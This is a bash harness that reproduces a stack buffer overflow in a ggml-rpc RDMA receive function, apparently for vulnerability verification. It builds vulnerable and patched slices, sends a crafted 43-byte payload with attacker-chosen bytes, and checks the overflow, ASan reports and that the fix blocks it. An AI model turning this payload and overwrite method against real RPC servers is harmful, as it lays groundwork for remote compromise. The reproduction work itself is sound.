#!/usr/bin/env bash
# llamarpc2shell — verbatim-slice harness for CVE-2026-118375 (ggml-rpc rdma_recv)
# Every run re-extracts rdma_recv from pinned transport.cpp blobs, asserts their
# hashes, builds vulnerable/fixed x plain/ASan, and checks the rung ladder.
set -u
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(dirname "$HERE")"
SRC="$ROOT/src"
OUT="$HERE/evidence"
mkdir -p "$OUT"
TMP="$(mktemp -d /tmp/llamarpc2shell.XXXXXX)"
trap 'rm -rf "$TMP"' EXIT
PASS=0; FAIL=0
ck() { if [ "$2" = "1" ]; then echo "PASS $1"; PASS=$((PASS+1)); else echo "FAIL $1"; FAIL=$((FAIL+1)); fi; }
hr() { sha256sum "$1" | awk '{print $1}'; }

VULN_SHA=a5a6774d87398344a09da643de6ac175ad8188c91d8def25f6dad9c0e8957e34
FIX_SHA=cd61f2ec3968d2cfc90eb2ea30f9a2762f5160b14a9bddfcd64b11361fc8da43
PATCH_SHA=28056890f2a24ffaaa7df4858588529f733cdd092e0f93b7014c68236b0f5736
CALLER_SHA=583cf1ee149c5b94c215eca07a293564d1b755427b57b1a7846f0328e724eacd

ck PIN_VULN "$([ "$(hr "$SRC/transport-vuln.cpp")" = "$VULN_SHA" ] && echo 1 || echo 0)"
ck PIN_FIXED "$([ "$(hr "$SRC/transport-fixed.cpp")" = "$FIX_SHA" ] && echo 1 || echo 0)"
ck PIN_PATCH "$([ "$(hr "$SRC/fix-9a0fde99.patch")" = "$PATCH_SHA" ] && echo 1 || echo 0)"
ck PIN_CALLER "$([ "$(hr "$SRC/ggml-rpc-vuln.cpp")" = "$CALLER_SHA" ] && echo 1 || echo 0)"

# The caller in the pinned vulnerable tree does read the initial command into a
# single byte, twice: rpc_serve_client at ggml-rpc.cpp:2434 and :2475.
N1="$(grep -c 'recv_data(&cmd, 1)' "$SRC/ggml-rpc-vuln.cpp")"
ck CALLER_1BYTE_SINK "$([ "$N1" -ge 2 ] && echo 1 || echo 0)"

# Verbatim extraction: rdma_recv() definition through its column-0 closing brace.
extract() {
  awk '/^bool socket_t::impl::rdma_recv\(void \* data, size_t size\) \{/ {p=1} p {print} p && /^\}$/ {exit}' "$1"
}
extract "$SRC/transport-vuln.cpp" > "$TMP/slice-vuln.inc"
extract "$SRC/transport-fixed.cpp" > "$TMP/slice-fixed.inc"
ck SLICE_NONEMPTY "$([ -s "$TMP/slice-vuln.inc" ] && [ -s "$TMP/slice-fixed.inc" ] && echo 1 || echo 0)"
ck SLICE_VULN_MEMCPY "$(grep -q 'memcpy(dst, c->rx_slot(slot), got);' "$TMP/slice-vuln.inc" && echo 1 || echo 0)"
ck SLICE_VULN_NO_GUARD "$(grep -q 'got > rem' "$TMP/slice-vuln.inc" && echo 0 || echo 1)"
ck SLICE_FIXED_GUARD "$(grep -q 'if (got > rem)' "$TMP/slice-fixed.inc" && echo 1 || echo 0)"
ck SLICE_FIXED_MEMCPY "$(grep -q 'memcpy(dst, c->rx_slot(slot), got);' "$TMP/slice-fixed.inc" && echo 1 || echo 0)"

# The published fix hunk must apply to the pinned vulnerable blob.
mkdir -p "$TMP/dry/ggml/src/ggml-rpc"
cp "$SRC/transport-vuln.cpp" "$TMP/dry/ggml/src/ggml-rpc/transport.cpp"
patch -d "$TMP/dry" --dry-run -p1 -F3 < "$SRC/fix-9a0fde99.patch" > "$OUT/fix-dryrun.txt" 2>&1
ck FIX_HUNK_APPLIES "$([ $? -eq 0 ] && echo 1 || echo 0)"

build() { # name slice extraflags compiler
  cat "$HERE/driver_head.cpp" "$2" "$HERE/driver_main.cpp" > "$TMP/$1.cpp"
  $4 -std=c++17 -O0 -g $3 -o "$TMP/$1" "$TMP/$1.cpp" > "$OUT/build-$1.log" 2>&1
}
build vuln-plain "$TMP/slice-vuln.inc" "" g++
build fixed-plain "$TMP/slice-fixed.inc" "" g++
build vuln-asan "$TMP/slice-vuln.inc" "-DASAN_BUILD -fsanitize=address -fno-omit-frame-pointer" g++
build vuln-asan-clang "$TMP/slice-vuln.inc" "-DASAN_BUILD -fsanitize=address -fno-omit-frame-pointer" clang++
build fixed-asan "$TMP/slice-fixed.inc" "-DASAN_BUILD -fsanitize=address -fno-omit-frame-pointer" g++
ck BUILDS "$([ -x "$TMP/vuln-plain" ] && [ -x "$TMP/fixed-plain" ] && [ -x "$TMP/vuln-asan" ] && [ -x "$TMP/vuln-asan-clang" ] && [ -x "$TMP/fixed-asan" ] && echo 1 || echo 0)"

# Attacker message: 43 bytes, chosen 0x5a at offset 11 and 0x44 at offset 18.
PAYLOAD="$(python3 -c 'b=bytearray([0x41]*43); b[11]=0x5a; b[18]=0x44; print(b.hex())')"

"$TMP/vuln-plain" 43 "$PAYLOAD" > "$OUT/plain-attack.out" 2>&1
"$TMP/fixed-plain" 43 "$PAYLOAD" > "$OUT/fixed-attack.out" 2>&1
"$TMP/vuln-plain" 1 41 > "$OUT/plain-safe.out" 2>&1
"$TMP/vuln-asan" 43 "$PAYLOAD" > "$OUT/vuln-gcc-asan.out" 2>&1; GA_RC=$?
"$TMP/vuln-asan-clang" 43 "$PAYLOAD" > "$OUT/vuln-clang-asan.out" 2>&1; CA_RC=$?
"$TMP/fixed-asan" 43 "$PAYLOAD" > "$OUT/fixed-asan.out" 2>&1; FA_RC=$?
"$TMP/vuln-asan" 1 41 > "$OUT/vuln-asan-safe.out" 2>&1; VS_RC=$?

g() { grep -E "^$2=" "$1" | head -1 | cut -d= -f2-; }
ck R1_OOB "$([ "$(g "$OUT/plain-attack.out" OOB)" = 42 ] && echo 1 || echo 0)"
ck R1_UNDERFLOW "$([ "$(g "$OUT/plain-attack.out" REM_UNDERFLOW)" = 18446744073709551574 ] && echo 1 || echo 0)"
ck R2_OVERFLOW_OBSERVED "$([ "$(g "$OUT/plain-attack.out" TAIL0)" = 41 ] && echo 1 || echo 0)"
ck R2_POSTED "$([ "$(g "$OUT/plain-attack.out" POSTED)" = 1 ] && echo 1 || echo 0)"
ck R4_CHOSEN_0x5a "$([ "$(g "$OUT/plain-attack.out" TAIL10)" = 5a ] && echo 1 || echo 0)"
ck R4_CHOSEN_0x44 "$([ "$(g "$OUT/plain-attack.out" TAIL17)" = 44 ] && echo 1 || echo 0)"
ck R4_CANARY_BEYOND "$([ "$(g "$OUT/plain-attack.out" TAIL43)" = c7 ] && echo 1 || echo 0)"
ck R3_GCC_ASAN "$(grep -q 'stack-buffer-overflow' "$OUT/vuln-gcc-asan.out" && grep -q 'WRITE of size 43' "$OUT/vuln-gcc-asan.out" && echo 1 || echo 0)"
ck R3_CLANG_ASAN "$(grep -q 'stack-buffer-overflow' "$OUT/vuln-clang-asan.out" && grep -q 'WRITE of size 43' "$OUT/vuln-clang-asan.out" && echo 1 || echo 0)"
ck R3_ASAN_IN_RDMA_RECV "$(grep -q 'rdma_recv' "$OUT/vuln-gcc-asan.out" && echo 1 || echo 0)"
ck FIXED_BLOCKS "$([ "$(g "$OUT/fixed-attack.out" TAIL0)" = c7 ] && [ "$(g "$OUT/fixed-attack.out" RC)" = 0 ] && echo 1 || echo 0)"
ck FIXED_LOGS "$([ "$(g "$OUT/fixed-attack.out" POSTED)" = 1 ] && grep -q 'RDMA recv overrun: got=43 rem=1' "$OUT/fixed-attack.out" && echo 1 || echo 0)"
ck FIXED_ASAN_CLEAN "$([ $FA_RC -eq 0 ] && ! grep -q 'AddressSanitizer' "$OUT/fixed-asan.out" && echo 1 || echo 0)"
ck SAFE_VULN_CLEAN "$([ $VS_RC -eq 0 ] && [ "$(g "$OUT/plain-safe.out" TAIL0)" = c7 ] && echo 1 || echo 0)"
ck GCC_ASAN_REPORTED "$([ $GA_RC -ne 0 ] && echo 1 || echo 0)"
ck CLANG_ASAN_REPORTED "$([ $CA_RC -ne 0 ] && echo 1 || echo 0)"

# Normalized trace: drop compiler/PID/address lines, keep measured fields.
cat "$OUT/plain-attack.out" "$OUT/fixed-attack.out" "$OUT/plain-safe.out" \
  | grep -E '^(MODE|GOT|REQUESTED|OOB|REM_UNDERFLOW|RC|POSTED|SINK|TAIL[0-9]+|TRACE_END)=' \
  > "$OUT/trace.txt"
TRACE_SHA="$(hr "$OUT/trace.txt")"
echo "TRACE_SHA256=$TRACE_SHA"

if [ "${REPLAY:-0}" != 1 ]; then
  RDIR=/tmp/llamarpc2shell-clean-replay
  rm -rf "$RDIR"; mkdir -p "$RDIR"
  cp -r "$SRC" "$HERE" "$RDIR/"
  (cd "$RDIR/harness" && REPLAY=1 bash run.sh > "$RDIR/replay.txt" 2>&1)
  RR=$?
  RPASS="$(grep -c '^PASS ' "$RDIR/replay.txt")"
  RFAIL="$(grep -c '^FAIL ' "$RDIR/replay.txt")"
  RTX="$(grep '^TRACE_SHA256=' "$RDIR/replay.txt" | tail -1)"
  ck TMP_REPLAY "$([ $RR -eq 0 ] && [ "$RFAIL" = 0 ] && [ "$RPASS" = "$PASS" ] && [ "$RTX" = "TRACE_SHA256=$TRACE_SHA" ] && echo 1 || echo 0)"
fi

echo "PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
